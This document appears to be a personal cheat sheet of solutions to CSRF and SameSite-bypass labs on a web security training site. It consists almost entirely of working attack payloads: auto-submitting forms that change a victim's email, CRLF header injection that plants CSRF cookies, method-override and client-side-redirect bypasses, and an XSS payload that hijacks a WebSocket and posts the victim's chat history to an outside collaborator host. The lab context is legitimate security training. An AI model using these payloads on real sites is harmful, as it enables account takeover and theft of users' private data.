# Change victim's email by delivering HTML

```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://example.com/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="attacker@email.com" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>

```

# CSRF where token is tied to non-session cookie
Chaining with HTTP Header Injection attack
```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="https://0a82007f0444bb23803afdf700cd0005.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="tes010sdsadsasdasdasdsaadsa101t@email.com" />
      <input type="hidden" name="csrf" value="Ggd1f3fPljuKvc8LrMc7ph2D81DY0cYh" />
      <input type="submit" value="Submit request" />
    </form>
  <img src="https://0a82007f0444bb23803afdf700cd0005.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=NjUazbrT7WjabAgfxcyyOmHbRJpSrn5e%3b%20SameSite=None" onerror="document.forms[0].submit()">
  </body>
</html>

```

# CSRF where token is duplicated in cookie
Chaining with HTTP Header Injection attack
```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <script>history.pushState('', '', '/');</script>
    <form action="https://0a2200f804d13376803bd0c0002500ff.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="csrf" value="fake" />
      <input type="hidden" name="email" value="test123@test.com" />
      <input type="submit" value="Submit request" />
    </form>

    <img src="https://0a2200f804d13376803bd0c0002500ff.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None" onerror="document.forms[0].submit()">
  </body>
</html>

```

# Lax Bypass via method override
```html
<html>
  <body>
    <script>
      document.location = "https://0a83000003266e2e81bd43e300e800e2.web-security-academy.net/my-account/change-email?email=hack@test.com&_method=POST"
    </script>
  </body>
</html>
```

# SameSite Strict bypass via client-side redirect
```html
<html>
  <body>
    <script>
      document.location = "https://0ab300be042367bb8e52f549006800bf.web-security-academy.net/post/comment/confirmation?postId=1/../../../my-account/change-email?email=hack2%40test.com%26submit=1"
    </script>
  </body>
</html>
```

# SameSite Strict bypass via sibling domain
1. User is redirected to a website with different subdomain which is vulnerable to XSS
2. XSS payload is
```javascript
<script>
    var ws = new WebSocket('wss://0a3000b803074751804203d000d40031.web-security-academy.net/chat');
    ws.onopen = function() {
        ws.send("READY");
    };
    ws.onmessage = function(event) {
        fetch('https://0648kceqs985mif9anphzwo2wt2kqbe0.oastify.com', {method: 'POST', mode: 'no-cors', body: event.data});
    };
</script>
```
3. XSS payload
 - creates a new websocket which is initiated with HTTPS request (sends its cookie with request)
 - set onmessage event listener to send event data (chat history) to collaborator 

```html
<script>
    document.location = "https://cms-0a3000b803074751804203d000d40031.web-security-academy.net/login?username=%3Cscript%3E%0A%20%20%20%20var%20ws%20%3D%20new%20WebSocket%28%27wss%3A%2F%2F0a3000b803074751804203d000d40031.web-security-academy.net%2Fchat%27%29%3B%0A%20%20%20%20ws.onopen%20%3D%20function%28%29%20%7B%0A%20%20%20%20%20%20%20%20ws.send%28%22READY%22%29%3B%0A%20%20%20%20%7D%3B%0A%20%20%20%20ws.onmessage%20%3D%20function%28event%29%20%7B%0A%20%20%20%20%20%20%20%20fetch%28%27https%3A%2F%2F0648kceqs985mif9anphzwo2wt2kqbe0.oastify.com%27%2C%20%7Bmethod%3A%20%27POST%27%2C%20mode%3A%20%27no-cors%27%2C%20body%3A%20event.data%7D%29%3B%0A%20%20%20%20%7D%3B%0A%3C%2Fscript%3E&password=anything";
</script>
```

# SameSite Lax bypass via cookie refresh
```html
<form method="POST" action="https://0a2400c2036c579381f3202d00e500c9.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="pwnedaaa@web-security-academy.net">
</form>
<script>
    window.open('https://0a2400c2036c579381f3202d00e500c9.web-security-academy.net/social-login');
    setTimeout(changeEmail, 5000);

    function changeEmail(){
        document.forms[0].submit();
    }
</script>
```

# CSRF where Referer validation depends on the header being present
```html
<html>
<head>
<meta name="referrer" content="no-referrer">
</head>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0a3c00eb04008678809a994d00b900c3.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="test&#64;test&#46;com" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```

# CSRF with broken Referer validation
Add header below to allow query parameters in referrer header
```
Referrer-Policy: unsafe-url
```

```html
<html>
  <body>
    <script>
             history.pushState('', '', '/?0a4c00a9048af37580281c99007e00b0.web-security-academy.net');
    </script>
    <form action="https://0a4c00a9048af37580281c99007e00b0.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="test1222&#64;test&#46;com" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```